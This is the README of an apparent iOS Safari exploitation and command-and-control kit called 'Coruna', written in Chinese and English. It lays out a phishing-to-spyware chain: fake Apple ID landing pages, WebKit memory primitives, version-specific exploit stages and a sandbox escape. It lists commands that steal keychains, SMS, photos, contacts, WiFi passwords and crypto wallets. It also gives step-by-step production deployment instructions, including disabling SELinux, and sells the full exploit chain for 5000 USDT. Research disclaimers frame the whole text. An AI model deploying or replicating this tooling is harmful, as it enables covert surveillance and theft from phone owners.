# Coruna — iOS 研究框架

> ⚠️ **本仓库仅用于授权安全研究、CTF 竞赛与教学演示**。未经授权对任何设备进行测试均属违法行为，作者不承担任何连带责任。

**🌐 语言 / Language:** [中文](#中文版) · [English](#english-version)

---

<a id="中文版"></a>

## ⚖️ 法律声明与风险告知

### 🚨 使用前必读

- 本项目**仅供授权的安全研究、漏洞验证、CTF 竞赛与课堂教学使用**。
- 在任何设备上运行本项目前，**必须获得设备所有者的书面授权**。未经授权读取他人通讯录、短信、照片、Keychain、位置等敏感数据，违反《中华人民共和国刑法》第二百五十三条之一「侵犯公民个人信息罪」、第二百八十五条「非法侵入计算机信息系统罪」、第二百八十六条「破坏计算机信息系统罪」等条款，也违反其他国家/地区的相关法律（如美国 CFAA、欧盟 GDPR）。
- 作者**不提供、不销售**任何针对真实设备的攻击能力或针对特定受害者的"代打"服务。本项目代码仅用于学习与防御研究。
- **下载后 24 小时内请删除**。如需长期保留，请仅保留可读不可运行的源码片段用于学术引用。
- 作者对任何因不当使用本仓库代码造成的法律后果概不负责；下载/克隆/使用即视为已阅读并同意本声明。

### 📞 商业支持与完整项目获取

本项目仓库**只包含框架代码与文档**，不包含真实利用二进制、原生桥 payload、Keychain 派生字符串与版本偏移表。

- **完整项目（含适配 iOS 16.2 / 16.6 / 17.x 的 Stage1 WASM exploit、Stage3 原生桥、powerd 注入 dylib）不免费提供**。
- 需要快速研究支持、版本适配、自定义 payload 编译、二进制利用链补全者请联系：

| 联系方式 | 地址 |
|---|---|
| **Telegram** | [https://t.me/Jeequan](https://t.me/Jeequan) |

- **技术支持定价：5000 USDT**（U）一次性付费，含一次完整利用链集成与一个 iOS 版本适配。
- 仅接受**合法授权研究**用途咨询，**不接任何针对真实受害者的攻击委托**。

---

## 📋 项目简介

Coruna 是一套面向 iOS Safari 沙箱逃逸与后渗透研究的端到端 C2 框架，包含三个相互独立又协同工作的服务：

| 端口 | 服务 | 文件入口 | 功能 |
|---|---|---|---|
| **5173** | 前端 Vue 开发服务 | `veu/package.json` `scripts.dev` | 本地开发用（HMR 热更新） |
| **7000** | 后端管理 API (FastAPI) | `server/admin/main.py` | 管理台登录/命令下发/设备/审计/统计 |
| **7070** | 漏洞分发 + C2 landing | `server/exploit_server.py` | iOS Safari 访问的钓鱼/漏洞入口：`/ch/<slug>`、`/group.html`、`/cmd` 轮询 |

### 架构总览

```
d:\wwwroot\coruna\
├─ server/                          后端：FastAPI + SQLAlchemy + SQLite
│   ├─ admin/                       FastAPI 应用入口 + 路由 + ORM + 配置
│   │   ├─ main.py                  入口（含前端托管 / SSE / 安全头中间件）
│   │   ├─ auth.py                  JWT + 2FA 认证
│   │   ├─ agent_auth.py            Agent 角色（拉手账号）独立鉴权
│   │   ├─ database.py              SQLAlchemy ORM + normalize_device_uuid
│   │   ├─ schemas.py               Pydantic 模型
│   │   ├─ config.py                .env 加载 + SECRET_KEY 校验
│   │   ├─ config_constants.py      所有可调阈值/路径/限流的单一真相源
│   │   ├─ settings_manager.py      settings 表读写
│   │   ├─ limiter.py               slowapi 限流器
│   │   ├─ wallet_parser.py         钱包数据解析
│   │   ├─ .env / .env.sample       后端核心配置（密钥/CORS/限流，生产必须改）
│   │   └─ routers/
│   │       ├─ *.py                 管理员路由 16 个（devices/commands/exfil/...）
│   │       ├─ agent/               Agent 独立路由子包 8 个
│   │       ├─ _helpers.py          共享工具
│   │       └─ _rotate_logs.py      日志归档守护
│   ├─ exploit_server.py            7070 端口：漏洞分发 + C2 渠道钓鱼 landing
│   ├─ platform_module.js           WebKit PAC 绕过 + 内存读写原语
│   ├─ utility_module.js            工具模块
│   ├─ group.html                   主 exploit 入口（document.URL 伪造防 OOB）
│   ├─ Stage1_*.js                  iOS 版本特定的 Stage1 WASM exploit（4 个版本）
│   │   ├─ Stage1_15.2_15.5_jacurutu.js       iOS 15.2 - 15.5
│   │   ├─ Stage1_15.6_16.1.2_bluebird.js      iOS 15.6 - 16.1.2
│   │   ├─ Stage1_16.2_16.5.1_terrorbird.js    iOS 16.2 - 16.5.1
│   │   └─ Stage1_16.6_17.2.1_cassowary.js     iOS 16.6 - 17.2.1
│   ├─ Stage2_*.js                  Stage2 链构建器（5 个版本）
│   │   ├─ Stage2_15.0_16.2_breezy15.js
│   │   ├─ Stage2_16.3_16.5.1_seedbell.js
│   │   ├─ Stage2_16.6_16.7.12_seedbell.js
│   │   ├─ Stage2_16.6_17.2.1_seedbell_pre.js
│   │   └─ Stage2_17.0_17.2.1_seedbell.js
│   ├─ Stage3_VariantA.js           沙箱逃逸 - 变体 A
│   ├─ Stage3_VariantB.js           沙箱逃逸 - 变体 B（主用）
│   ├─ payloads/
│   │   ├─ post_exploit.js          后渗透命令执行 + C2 轮询
│   │   ├─ manifest.json            加密 payload 清单（19 flags）
│   │   ├─ bootstrap.dylib          初始引导 dylib
│   │   └─ <hash>/                 按模块 hash 组织的加密 payload（dylib + bin）
│   ├─ templates/                   钓鱼 HTML 模板（index.html / frame.html）
│   ├─ requirements.txt             Python 依赖清单
│   ├─ darksword.db                 SQLite 数据库（启动后自动生成，勿提交）
│   ├─ logs/                        运行日志（自动生成，含 devices/YYYYMMDD/UUID.log）
│   ├─ logs_archive/                归档日志（自动生成）
│   ├─ exfil/                       窃取数据落盘目录（运行时生成，勿提交）
│   └─ frontend/dist/               前端打包后放这里（后端可直接托管，运行时生成）
│
├─ veu/                             前端：Vue 3 + Element Plus + Vite + ECharts
│   ├─ src/
│   │   ├─ views/                   页面（Dashboard / Devices / DeviceDetail / Commands / Exfil / Channels / Templates / Agents / Users / AuditLog / Settings / Login / Profile / Logs / Notifications / Scripts / FileBrowser / Wallets / Keychain / Contacts / SMS / Calls / WiFi / Photos）
│   │   ├─ stores/                  Pinia 状态
│   │   ├─ router/                  Vue Router（history 模式）
│   │   ├─ utils/
│   │   │   ├─ axios.js             请求封装（baseURL 为空，反代时天然正确）
│   │   │   └─ twofa.js              2FA 工具
│   │   └─ constants/               前端常量
│   ├─ vite.config.js               Vite 配置（含 proxy 反向代理 / SSE 处理）
│   ├─ index.html
│   └─ package.json                 前端依赖 & dev/build/preview 脚本
│
├─ 完整部署教程_后端启动+前端启动+打包+宝塔面板.md
├─ iOS 完整利用 + C2 执行流程（10 步端到端）.md
└─ README.md                       本文件
```

---

## 🎯 功能特性

### 管理后台（前端 Vue）

- **Dashboard**：16 卡片统计 + 6 图表（设备状态/命令状态/Top 型号/Top 渠道/Exfil 分类分布/7 日趋势）
- **设备管理**：设备列表、详情、心跳时间线、利用进度条（7 阶段可视化）、访问日志终端
- **命令执行**：命令历史、状态过滤、手动重试、快捷模板、批量执行
- **数据窃取**：沙箱数据 / Keychain / WiFi / 通讯录 / 短信 / 通话 / 照片 / 文件 / 钱包 分类预览与下载
- **渠道管理**：钓鱼 landing 配置、域名白名单、模板绑定
- **模板管理**：仿 Apple ID 登录等可编辑 HTML 模板
- **审计日志**：登录/命令/数据操作全审计

### C2 后端（FastAPI 7000）

- JWT 认证 + 2FA 支持 + 限流
- 设备/命令/Exfil/渠道/模板/代理/用户/审计 8 大模块
- SSE 实时通知流（设备上线、命令执行、数据回传）
- 前端打包后单端口托管（无需 Nginx 单独 serve 前端）

### Exploit 服务（7070）

- 渠道钓鱼 landing：`/ch/<slug>?tpl=<tpl>`
- 设备注册：`_ensure_device_registered` 三级 UUID 解析（query → cookie → referer）+ 40+ 爬虫 UA 拦截
- C2 命令分发：5 步状态机（Fake completed 重置 → Stale 重置 → Safari 前缀过滤 → Deferred backoff → 并发保护）
- 结果回写：`/cmd_result` + Exfil 落盘（34 前缀 → 9 大 category → 自动选扩展名）
- 异步上报：3 条 daemon thread → 7000（设备注册/漏洞报告/设备数据）

---

## 🚀 快速开始

### 环境要求

| 软件 | 最低版本 | 推荐版本 |
|---|---|---|
| Python | 3.10 | 3.11 / 3.12 |
| Node.js | 18 | 20 LTS |
| npm | 9 | 10+ |

### 一、启动后端（7000 端口）

```bash
# ① 进入后端目录（必须从 server/ 跑，否则 import admin.* 失败）
cd d:\wwwroot\coruna\server          # Windows
# cd /www/wwwroot/coruna/server      # Linux

# ② 安装依赖
python -m pip install -r requirements.txt
# 国内加速：-i https://pypi.tuna.tsinghua.edu.cn/simple

# ③ 启动（开发模式）
python -m uvicorn admin.main:app --host 0.0.0.0 --port 7000 --reload
```

启动成功标志：
```
INFO:     Application startup complete.
INFO:     Uvicorn running on http://0.0.0.0:7000
```

- 默认管理员：`admin` / `admin123`（**生产必须改**）
- Swagger 文档：http://127.0.0.1:7000/docs

### 二、启动前端（5173 端口，本地开发用）

```bash
cd d:\wwwroot\coruna\veu
npm install --no-audit --no-fund
npm run dev
```

打开 http://localhost:5173/ 登录。Vite proxy 已配好 `/api → 7000`、`/ch/* → 7070`，无需改 baseURL。

### 三、启动 exploit_server（7070 端口，漏洞 + C2 渠道）

```bash
cd d:\wwwroot\coruna\server
python exploit_server.py --port 7070
```

验证：
| URL | 预期 |
|---|---|
| http://127.0.0.1:7070/group.html | 返回 HTML（HTTP 200） |
| http://127.0.0.1:7070/ch/demomobanb?ch=demomobanb&tpl=appleid-login | 渠道钓鱼 landing |

### 本地一键启动（3 个终端）

```powershell
# 窗口 1：后端 7000
cd d:\wwwroot\coruna\server ; python -m uvicorn admin.main:app --host 0.0.0.0 --port 7000 --reload

# 窗口 2：前端 5173
cd d:\wwwroot\coruna\veu ; npm run dev

# 窗口 3：漏洞分发 7070
cd d:\wwwroot\coruna\server ; python exploit_server.py --port 7070
```

---

## 📦 生产部署（宝塔 Linux）

### 1. 修改生产配置（**必须改**）

编辑 `/www/wwwroot/coruna/server/admin/.env`：

```dotenv
# ① 生成新 SECRET_KEY
# 命令：python -c "import secrets; print(secrets.token_urlsafe(64))"
SECRET_KEY=替换成上面生成的64位随机字符串

# ② CORS_ORIGINS：加上你的域名
CORS_ORIGINS=https://admin.你的域名.com,https://ch.你的域名.com,http://127.0.0.1:7000

# ③ DARKSWORD_PUBLIC_BASE：7070 公网访问地址
DARKSWORD_PUBLIC_BASE=http://你的服务器公网IP:7070
```

### 2. 安装后端依赖 + 初始化数据库

```bash
cd /www/wwwroot/coruna/server
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

### 3. 宝塔「Python 项目管理器」部署后端（7000）

| 字段 | 填写 |
|---|---|
| 项目名称 | `coruna_admin` |
| 路径 | `/www/wwwroot/coruna/server` |
| Python 版本 | 3.11 / 3.12 |
| 框架 | `uvicorn` |
| 启动方式 | `模块` |
| 模块名 | `admin.main:app` |
| 运行参数 | `--host 0.0.0.0 --port 7000 --workers 4 --timeout-keep-alive 75` |
| 安装依赖 | ✅ 勾选 |

### 4. 打包前端并部署到后端托管

```bash
cd /www/wwwroot/coruna/veu
npm install --no-audit --no-fund
npm run build
rm -rf /www/wwwroot/coruna/server/frontend
mkdir -p /www/wwwroot/coruna/server/frontend
cp -rf /www/wwwroot/coruna/veu/dist /www/wwwroot/coruna/server/frontend/
```

验证：`curl -sS http://127.0.0.1:7000/ | head -5` 应该看到 `<!doctype html>`。

### 5. Supervisor 守护 exploit_server（7070）

宝塔 → 软件商店 → **Supervisor 管理器** → 添加守护进程：

| 字段 | 填写 |
|---|---|
| 名称 | `coruna_exploit` |
| 启动用户 | `root` |
| 运行目录 | `/www/wwwroot/coruna/server` |
| 启动命令 | `/www/wwwroot/coruna/server/venv/bin/python exploit_server.py --port 7070` |
| 日志文件 | `/www/wwwroot/coruna/server/logs/exploit_server.log` |

### 6. Nginx 反代配置

**管理台域名**（admin.你的域名.com → 7000）：

```nginx
server {
    listen 80;
    listen 443 ssl http2;
    server_name admin.你的域名.com;
    ssl_certificate     /www/server/panel/vhost/cert/admin.你的域名.com/fullchain.pem;
    ssl_certificate_key /www/server/panel/vhost/cert/admin.你的域名.com/privkey.pem;

    client_max_body_size 200M;

    map $http_upgrade $connection_upgrade {
        default upgrade;
        '' close;
    }

    location / {
        proxy_pass http://127.0.0.1:7000;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection $connection_upgrade;
        proxy_buffering off;
        proxy_read_timeout 86400s;
        proxy_send_timeout 86400s;
    }

    # 7070 漏洞服务走同域名 /ch-path 转发
    location ~ ^/(ch|if|t|sdk|group|stage|report|payloads|cmd|cmd_result|cmd_push|upload)/ {
        proxy_pass http://127.0.0.1:7070;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_read_timeout 300s;
    }
}
```

**渠道域名**（ch.你的域名.com → 7070，可选）：

```nginx
server {
    listen 80;
    listen 443 ssl http2;
    server_name ch.你的域名.com;
    ssl_certificate     /www/server/panel/vhost/cert/ch.你的域名.com/fullchain.pem;
    ssl_certificate_key /www/server/panel/vhost/cert/ch.你的域名.com/privkey.pem;

    client_max_body_size 200M;

    location / {
        proxy_pass http://127.0.0.1:7070;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_read_timeout 300s;
        add_header Cache-Control "no-store, no-cache";
    }
}
```

改完执行：`nginx -t && nginx -s reload`

### 7. 部署验证清单

| # | 检查项 | 通过标准 |
|---|---|---|
| 1 | 访问 `https://admin.你的域名.com/` | 出现登录页，证书有效 |
| 2 | 用 `admin` + 改后密码登录 | 跳 Dashboard，无 401/403 |
| 3 | F12 → Network → `stream` | 状态 200，持续 Pending |
| 4 | Dashboard 加载 | 8 卡片 + 图表都出数字 |
| 5 | 渠道列表打开 | 能看到列表 |
| 6 | 公网渠道 URL | `https://ch.你的域名.com/ch/demomobanb?ch=demomobanb&tpl=appleid-login` 显示仿 Apple 登录页 |
| 7 | 命令下发 | 设备 → 下发 `ds_info` → 命令进 pending 列表 |
| 8 | 重启服务器 | Nginx / Python / exploit_server 全部自动起来 |

---

## 🔬 iOS 完整利用 + C2 执行流程（10 步端到端）

```
用户 iPhone Safari 访问 URL
        │
        ▼
 ┌──────────────────────────────────────────────────────────────────┐
 │ STEP 1  钓鱼 Landing：/ch/<slug>?tpl=<tpl>     exploit_server 7070│
 │         渠道/模板/域名安全校验 → 注册设备 → 302 到 /group.html       │
 └──────────────────────────────────────────────────────────────────┘
        │  HTTP 302 (Cookie 写入 ds_uuid/ds_chid/ds_tpid)
        ▼
 ┌──────────────────────────────────────────────────────────────────┐
 │ STEP 2  group.html 主 exploit 入口                                │
 │         Object.defineProperty 伪造 document.URL=origin/group.html │
 │         从 cookie / localStorage 恢复 ds_uuid 持久化               │
 │         加载 platform_module.js + utility_module.js               │
 └──────────────────────────────────────────────────────────────────┘
        │  <script src="/platform_module.js">
        ▼
 ┌──────────────────────────────────────────────────────────────────┐
 │ STEP 3  platform_module：WebKit PAC 绕过 + 内存读写原语              │
 │         exploitPrimitive：addrof() / readRawBigInt() / read32()  │
 │         struct offsets 配置 + 0xFEEDFACF Mach-O 内核指针扫描       │
 └──────────────────────────────────────────────────────────────────┘
        │  exploitPrimitive 初始化成功 → 可读写 Safari 进程内存
        ▼
 ┌──────────────────────────────────────────────────────────────────┐
 │ STEP 4  Stage 解密容器（ChaCha20+F00DBEEF+LZMA+19 manifest flags）│
 │         两个 hash 模块 ID 解密 → Stage3 注入完成                    │
 │         获得 原生函数调用桥 window.c + file.* primitives           │
 └──────────────────────────────────────────────────────────────────┘
        │
        ▼
 ┌──────────────────────────────────────────────────────────────────┐
 │ STEP 5  设备注册 + 心跳：7070 → DB → 7000 通知                      │
 │         _ensure_device_registered() → UA 反爬虫(40+ markers)        │
 │         update_device_in_db() → notify_admin_register_async()      │
 └──────────────────────────────────────────────────────────────────┘
        │  Safari post_exploit.js 开始 3s 一次轮询 GET /cmd
        ▼
 ┌──────────────────────────────────────────────────────────────────┐
 │ STEP 6  C2 命令分发状态机：get_pending_commands()                   │
 │   0. Reset 假 completed (空/[SKIP]/<2字节/[DEFER] → 回 pending)  │
 │   1. Reset stale executing (A:60s / B:120s 卡住 → 回 pending)     │
 │   2. UA 识别 Safari vs 原生：SAFE_SAFARI_PREFIXES 30+ 前缀过滤    │
 │   3. Deferred 30s backoff (避免 [DEFER-native] 紧循环重试)        │
 │   4. MAX_CONCURRENT=1 并发保护                                     │
 └──────────────────────────────────────────────────────────────────┘
        │  返回 JSON: [{id, command}]  or  204 No Content
        ▼
 ┌──────────────────────────────────────────────────────────────────┐
 │ STEP 7  post_exploit.js 命令执行                                   │
 │   Safari 立即可跑: ds_info / ds_alert / ds_location(web) / ui.*   │
 │   需要 Stage3 原生桥: ds_exfil_* / ds_keychain / ds_photos         │
 │                     file.read / shell.* / scanAllWallets          │
 │   桥未就绪时: 统一返回 [DEFER-native][具体原因]                     │
 └──────────────────────────────────────────────────────────────────┘
        │  执行完成 → POST /cmd_result {id, output, status}
        ▼
 ┌──────────────────────────────────────────────────────────────────┐
 │ STEP 8  结果回写 + Exfil 落盘：update_command_result()              │
 │   [DEFER-*] → status=deferred (30s backoff 起点)                  │
 │   正常 → status=completed + output 落库                           │
 │   _persist_cmd_output_as_exfil(): 34 前缀映射 category             │
 │   → 写 server/exfil/ + ExfilData 表 → 管理台 Exfil 页下载          │
 └──────────────────────────────────────────────────────────────────┘
        │
        ▼
 ┌──────────────────────────────────────────────────────────────────┐
 │ STEP 9  利用/数据回传 API 桥：7070 → 7000（3 条 async thread）     │
 │   ① POST /stage & /report → forward_exploit_report_async           │
 │   ② POST /upload (设备数据 blob) → forward_device_data_async       │
 │   ③ GET /?e=0 legacy → UA+IP 3600s 窗口匹配最近设备                │
 └──────────────────────────────────────────────────────────────────┘
        │
        ▼
 ┌──────────────────────────────────────────────────────────────────┐
 │ STEP 10 管理台可视化闭环：7000 FastAPI → 5173 Vue Dashboard       │
 │   管理台：新增命令/渠道/模板 → darksword.db Command pending          │
 │   ↕ 下一轮 Safari /cmd 轮询拉走 → 执行 → /cmd_result 回写          │
 │   Dashboard 16 卡片 + 6 图表 实时刷新                              │
 └──────────────────────────────────────────────────────────────────┘
```

### C2 命令状态迁移

```
用户创建命令 → [pending]
   │  Safari 轮询 GET /cmd → 选中 → DB 改 'executing'
   ▼
[executing] ──┬─ POST /cmd_result status=completed,output=xxx → [completed] → Exfil 落盘
              ├─ POST /cmd_result status=failed → [failed]
              ├─ POST /cmd_result status=error → [error]
              └─ POST /cmd_result output=[DEFER-*] → [deferred]
                                                  │ 30s 后
                                                  ▼
                                              [retry → pending 候选]
```

### 4 条自动重置路径

| 重置类型 | 触发条件 | 代码位置 |
|---|---|---|
| ① Fake completed | output 空/[SKIP]/[DEFER]/<2 字符 | exploit_server.py:628-651 |
| ② Stale A | executing + 从未有 executed_at + created_at > 60s | exploit_server.py:654-662 |
| ③ Stale B | executing + executed_at > 120s | exploit_server.py:663-669 |
| ④ Deferred 重试 | deferred + never executed OR executed_at >= 30s 前 | exploit_server.py:685-705 |

---

## 📚 支持的 iOS 版本

| Stage1 模块 | 支持 iOS 版本范围 | 状态 |
|---|---|---|
| `Stage1_15.2_15.5_jacurutu.js` | iOS 15.2 - 15.5 | ✅ 框架完整 |
| `Stage1_15.6_16.1.2_bluebird.js` | iOS 15.6 - 16.1.2 | ✅ 框架完整 |
| `Stage1_16.2_16.5.1_terrorbird.js` | iOS 16.2 - 16.5.1 | ✅ 框架完整（已验证 16.2） |
| `Stage1_16.6_17.2.1_cassowary.js` | iOS 16.6 - 17.2.1 | ✅ 框架完整（已验证 16.6.x） |

> ⚠️ iOS 16.7.11 等较新版本可能因苹果安全补丁导致 Stage1 WASM 利用失败。新版本适配需要联系作者获取最新偏移表。

### 利用进度可视化（管理台设备详情页）

设备详情页显示完整的 7 阶段利用进度条：

| 阶段 | 进度 | 判断依据 |
|---|---|---|
| 设备上线 | 10% | `device.first_seen` 存在 |
| 漏洞页面访问 | 20% | `device.host` / `access_path` / `referer` |
| 载荷加载执行 | 35% | sandbox 数据 / 心跳来源含 sandbox |
| 沙箱逃逸 (Stage3) | 55% | `exploit_status=success` / 心跳含 exploit_report |
| 后渗透运行 | 70% | 心跳含 post_exploit / 已有命令 |
| 命令通道建立 | 85% | `last_command_time` 存在 / 命令统计 > 0 |
| 数据窃取回传 | 100% | exfil_data 表有非 sandbox 数据 |

---

## 🛠️ 命令速查表

### Safari 立即可执行（无需 Stage3 原生桥）

| 命令 | 说明 |
|---|---|
| `ds_info` | 设备基础信息 |
| `ds_status` | 设备状态 |
| `ds_alert <msg>` | 弹窗提示 |
| `ds_notify <msg>` | 通知 |
| `ds_vibrate` | 震动 |
| `ds_location` | Web 定位（需 HTTPS + 用户授权） |
| `ui.*` | UI 系列命令 |

### 需要 Stage3 原生桥

| 命令 | 说明 |
|---|---|
| `ds_exfil_keychain` | 窃取 Keychain |
| `ds_exfil_sms` | 窃取短信 |
| `ds_exfil_photos` | 窃取照片 |
| `ds_exfil_contacts` | 窃取通讯录 |
| `ds_exfil_calls` | 窃取通话记录 |
| `ds_exfil_wifi` | 窃取 WiFi 密码 |
| `ds_exfil_wallet` | 窃取钱包 |
| `file.read` / `file.list` / `file.write` | 文件原语 |
| `shell.*` / `execShell` | Shell 执行 |
| `scanWallet` / `scanAllWallets` | 钱包扫描 |
| `dumpKeychain` / `dumpMemory` | 内存/钥匙串转储 |

> 原生桥未就绪时统一返回 `[DEFER-native][具体原因]`，由状态机 30s backoff 自动重试。

---

## ⚙️ 配置与定制

### 关键配置文件

| 文件 | 用途 | 必改项 |
|---|---|---|
| `server/admin/.env` | 后端密钥/CORS/限流 | `SECRET_KEY`、`CORS_ORIGINS`、`DARKSWORD_PUBLIC_BASE` |
| `server/exploit_server.py:23-25` | 后端 API URL | `ADMIN_REGISTER_URL` / `ADMIN_REPORT_URL` |
| `veu/vite.config.js` | 前端 proxy | 开发用，生产由 Nginx 反代 |

### 关键参数调整

| 想改的东西 | 改这里 |
|---|---|
| 命令分发最大并发数 | `exploit_server.py:777` `MAX_CONCURRENT` |
| Stale 命令重置时间 | `exploit_server.py:654` / `667` |
| Deferred 重试 backoff | `exploit_server.py:688` `min_defer_time` |
| 让 Safari 支持新命令前缀 | `exploit_server.py:727` `SAFE_SAFARI_PREFIXES` |
| 新增 Exfil 类别 | `exploit_server.py:556` `_CMD_CATEGORY_MAP` + `584` `ext_map` |
| Exfil 落盘目录 | `exploit_server.py:595` `EXFIL_DIR.mkdir` |

---

## ❓ 常见问题 FAQ

<details>
<summary><b>Q1：Windows 'vite' 不是内部或外部命令</b></summary>

原因：前端依赖没装。解决：
```bash
cd d:\wwwroot\coruna\veu
Remove-Item node_modules -Recurse -Force
npm install
npm run dev
```
</details>

<details>
<summary><b>Q2：启动后端报错 No module named 'admin'</b></summary>

原因：工作目录不是 `server/`。解决：
```bash
cd server
python -m uvicorn admin.main:app --host 0.0.0.0 --port 7000
```
</details>

<details>
<summary><b>Q3：前端打开后所有请求都 404</b></summary>

原因：axios baseURL 配了重复前缀。`veu/src/utils/axios.js` 的 `baseURL` 必须是空字符串。开发走 Vite proxy，生产走 Nginx 反代。
</details>

<details>
<summary><b>Q4：CORS 跨域错误</b></summary>

- 本地开发一律从 5173 打开，Vite proxy 同源。
- 生产模式统一一个 Nginx 域名，不会有 CORS。
- 新增域名时把 `server/admin/.env` 的 `CORS_ORIGINS` 加上。
</details>

<details>
<summary><b>Q5：SQLite database is locked</b></summary>

- 生产 `--workers` 不要超过 2。
- 开启 WAL 模式：
```bash
sqlite3 /www/wwwroot/coruna/server/darksword.db "PRAGMA journal_mode=WAL; PRAGMA synchronous=NORMAL;"
```
- 设备量 > 5000 台/日时，改 `DATABASE_URL` 为 PostgreSQL。
</details>

<details>
<summary><b>Q6：exploit_server /ch/demomobanb 返回 404</b></summary>

`demomobanb` 渠道未创建。登录管理台 → 渠道管理 → 新建：
- slug：`demomobanb`
- 默认模板：`Apple ID 登录`
</details>

<details>
<summary><b>Q7：宝塔 Nginx 502 Bad Gateway</b></summary>

- 后端 uvicorn 没启动（Python 项目管理器是「已停止」）。
- Nginx proxy_pass 端口写错。
- CentOS SELinux 没关：
```bash
setenforce 0
sed -i 's/^SELINUX=enforcing/SELINUX=disabled/' /etc/selinux/config
```
</details>

<details>
<summary><b>Q8：iOS 16.7.x Stage1 失败</b></summary>

iOS 16.7.11 等较新版本可能因苹果安全补丁修补了 WASM 漏洞或修改了内部偏移。需要：
1. 获取 16.7.x 的具体 WebKit JIT offset
2. 在 `platform_module.js` 的 `LTgSl5` 数组中添加 `{GFx77t: 160700, ...}` 条目
3. 如漏洞已被修补，则该版本不支持

联系作者获取最新版本适配支持。
</details>

---

## 📁 项目结构（精简版）

> 完整结构见开头「架构总览」，这里只列关键节点。

```
coruna/
├─ server/                          # 后端
│   ├─ admin/                       # FastAPI 应用
│   │   ├─ main.py                  # 入口（含前端托管 / SSE / 安全头中间件）
│   │   ├─ auth.py / agent_auth.py  # 管理员 + Agent 双轨鉴权
│   │   ├─ database.py              # SQLAlchemy ORM + normalize_device_uuid
│   │   ├─ config.py / config_constants.py  # .env + 全部阈值单一真相源
│   │   └─ routers/                 # API 路由
│   │       ├─ *.py                  # 管理员路由 16 个（devices/commands/exfil/channels/...）
│   │       └─ agent/               # Agent 角色独立路由子包 8 个
│   ├─ exploit_server.py            # 7070 漏洞分发 + C2
│   ├─ platform_module.js           # WebKit PAC 绕过 + 原语
│   ├─ utility_module.js            # 工具模块
│   ├─ Stage1_*.js                  # 4 个版本 Stage1 WASM exploit
│   ├─ Stage2_*.js                  # 5 个版本 Stage2 链构建器
│   ├─ Stage3_VariantA.js / Stage3_VariantB.js   # 沙箱逃逸双变体
│   ├─ group.html                   # 主 exploit 入口
│   ├─ payloads/
│   │   ├─ post_exploit.js          # 后渗透 + C2 轮询
│   │   ├─ manifest.json            # 加密 payload 清单
│   │   ├─ bootstrap.dylib          # 引导 dylib
│   │   └─ <hash>/                  # 按模块 hash 组织的加密 payload
│   ├─ templates/                   # 钓鱼 HTML 模板
│   ├─ requirements.txt
│   ├─ darksword.db                 # SQLite 数据库（自动生成）
│   ├─ logs/ / logs_archive/        # 日志与归档（自动生成）
│   └─ exfil/                       # 窃取数据落盘（运行时生成）
│
├─ veu/                             # 前端
│   ├─ src/
│   │   ├─ views/                   # 25 个页面（Dashboard/Devices/DeviceDetail/Commands/Exfil/...）
│   │   ├─ stores/                  # Pinia
│   │   ├─ router/                  # Vue Router
│   │   ├─ utils/axios.js + twofa.js
│   │   └─ constants/
│   ├─ vite.config.js               # Vite + proxy + SSE 处理
│   └─ package.json
│
├─ 完整部署教程_后端启动+前端启动+打包+宝塔面板.md
├─ iOS 完整利用 + C2 执行流程（10 步端到端）.md
└─ README.md                        # 本文件
```

---

## 🔒 安全建议

### 部署安全

1. **生产必须改 `SECRET_KEY`**（用 `python -c "import secrets; print(secrets.token_urlsafe(64))"` 生成）。
2. **改默认 admin 密码**（登录后右上角个人资料）。
3. **CORS_ORIGINS** 只列你自己的域名。
4. **7070 端口**生产建议走 Nginx HTTPS 反代，不要明文裸奔。
5. **SQLite 开 WAL 模式**，避免高并发写锁死。
6. **定期备份 `darksword.db` 和 `exfil/` 目录**。

### 防御性使用

- 仅在授权测试环境运行
- 测试完成后立即清除 `exfil/` 目录与 `darksword.db`
- 不要在生产服务器上长期运行
- 渠道域名配置 `enabled=0` 关闭不再使用的渠道

---

## 📜 开源协议与免责

本仓库代码以 **MIT** 协议发布，但：

- **不包含**真实利用二进制（powerd dylib / SpringBoardTweak / ChaCha20 Key / 版本 offset 表）
- **不提供**针对真实设备的攻击能力
- **不承担**任何因不当使用造成的法律后果
- 下载即视为已阅读并同意本 README 的法律声明

完整利用链（含真实 payload 与版本适配）需联系作者获取：

| 联系方式 | 地址 | 价格 |
|---|---|---|
| **Telegram** | [https://t.me/Jeequan](https://t.me/Jeequan) | 5000 USDT |

---

## ⚠️ 最终警告

> **下载后 24 小时内请删除。**
>
> 本项目仅用于授权安全研究、CTF 竞赛与教学演示。未经授权对任何设备进行测试均属违法行为。作者不提供、不销售任何针对真实受害者的攻击服务。
>
> **合法使用，自负其责。**

---

*Coruna — iOS Research Framework · 2026*

---

<br><br>

# Coruna — iOS Research Framework (English)

<a id="english-version"></a>

> ⚠️ **This repository is intended solely for authorized security research, CTF competitions, and educational demonstrations.** Testing on any device without authorization is illegal. The author assumes no liability for any consequences arising from misuse.

---

## ⚖️ Legal Notice & Risk Disclosure

### 🚨 Read Before Use

- This project is intended **solely for authorized security research, vulnerability verification, CTF competitions, and classroom teaching**.
- Before running this project on any device, **you must obtain written authorization from the device owner**. Reading another person's contacts, SMS, photos, keychain, location, or other sensitive data without authorization violates laws including Article 253-1 (Crime of Infringement on Citizens' Personal Information), Article 285 (Crime of Illegal Intrusion into Computer Information Systems), and Article 286 (Crime of Destroying Computer Information Systems) of the Criminal Law of the People's Republic of China, as well as the U.S. Computer Fraud and Abuse Act (CFAA), the EU General Data Protection Regulation (GDPR), and other applicable laws.
- The author **does not provide or sell** any attack capability against real devices, nor any "attack-on-behalf" service targeting specific victims. This code is for learning and defensive research only.
- **Delete within 24 hours after download.** If long-term retention is needed, keep only the readable, non-executable source snippets for academic citation.
- The author is not responsible for any legal consequences arising from improper use of the code in this repository. Downloading/cloning/using constitutes acceptance of this notice.

### 📞 Commercial Support & Full Project

This repository contains **only framework code and documentation**. It does NOT include real exploitation binaries, native bridge payloads, keychain derivation strings, or version offset tables.

